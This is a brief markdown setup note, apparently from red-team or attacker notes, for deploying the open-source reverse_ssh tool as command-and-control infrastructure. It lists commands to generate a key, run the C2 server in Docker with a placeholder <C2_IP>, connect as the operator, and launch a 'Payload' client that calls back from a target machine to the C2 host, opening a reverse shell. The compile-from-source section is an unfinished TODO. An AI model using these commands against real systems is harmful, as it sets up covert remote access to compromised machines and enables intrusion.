# Setup

## Generate SSH Key

```
$ ssh-keygen -qt rsa -b 4096 -f id_rsa -C '' -N ''
```

## Server

### Docker Setup

```
$ docker run -p 3232:2222 -e EXTERNAL_ADDRESS=<C2_IP>:3232 -e SEED_AUTHORIZED_KEYS="$(cat ~/.ssh/id_ed25519.pub)" -v ./data:/data reversessh/reverse_ssh
```

### Compile From Source

TODO: Fill in this info

```
$ git clone https://github.com/NHAS/reverse_ssh.git

$ server
```

## Operator

```
$ ssh -i /path/to/ssh_key -p 3232 <C2_IP>
```

## Payload

```
> client -d <C2_IP>:3232
```

---
## References

### Source Repositories

- [NHAS: Reverse SSH](https://github.com/NHAS/reverse_ssh)